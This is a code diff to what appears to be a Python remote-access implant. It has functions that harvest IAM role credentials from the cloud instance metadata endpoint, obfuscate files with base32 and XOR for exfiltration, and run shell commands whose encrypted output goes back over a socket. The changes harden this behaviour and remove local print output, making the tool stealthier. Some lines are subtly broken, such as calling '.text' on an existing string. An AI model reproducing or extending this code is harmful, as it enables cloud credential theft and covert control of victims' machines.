@@ -95,18 +95,21 @@ def init_info(system):
         try:
             fdisk = os.popen('fdisk -l').read()
             if not fdisk == "":
-                privileged = True
-                disks = []
-                alldisks = fdisk.split(" ")
+                if "Permission denied" in fdisk:
+                    privileged = False
+                else:
+                    privileged = True
+                    disks = []
+                    alldisks = fdisk.split(" ")
 
-                for d in alldisks:
-                    if "/dev/" in d:
-                        index = alldisks.index(d)
-                        d = d + " " + alldisks[index+1] + " " + alldisks[index+2]
-                        if not d in disks:
-                            disks.append(d.replace(":", ""))
+                    for d in alldisks:
+                        if "/dev/" in d:
+                            index = alldisks.index(d)
+                            d = d + " " + alldisks[index+1] + " " + alldisks[index+2]
+                            if not d in disks:
+                                disks.append(d.replace(":", ""))
 
-                check_env['DISKS'] = disks
+                    check_env['DISKS'] = disks
         except:
             pass
         else:
@@ -189,11 +192,16 @@ def meta_data():
                 meta_resp = requests.get("{}{}".format(metalink,value))
                 metadata[key] = meta_resp.text
 
-            iam_info = requests.get("{}{}".format(metalink, iam_metatest['iam-info'])).json()
-            iam_arn = iam_info['InstanceProfileArn']
-            ec2_role = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'])).text
-            iam_keys = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'], ec2_role.text)).json()
-            iam_keys['InstanceProfileArn'] = iam_arn
+            iam_req = requests.get("{}{}".format(metalink, iam_metatest['iam-info']))
+            if iam_req.status_code == 200:
+                iam_info = iam_req.json()
+                iam_arn = iam_info['InstanceProfileArn']
+                ec2_role = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'])).text
+                iam_keys = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'], ec2_role.text)).json()
+                iam_keys['InstanceProfileArn'] = iam_arn
+
+            else:
+                iam_keys = {}
 
             metadata['iam'] = iam_keys
 
@@ -267,7 +275,6 @@ def meta_data():
 def download(s, filepath, key):
     file = open(filepath, 'rb')
     filebytes = file.read()
-    print("Filesize: {}".format(len(filebytes)))
     filebytes_64 = base64.b32encode(filebytes)
     filebytes_xor = str_xor(filebytes_64.decode(), key)
 
@@ -434,7 +441,7 @@ def socket_create():
                 cout = err.decode()
             else:
                 cout = out.decode()
-            print(cout)
+
             senddt = str_xor(cout, ENCKEY)
             senddt += 'done'
             s.send(senddt.encode())
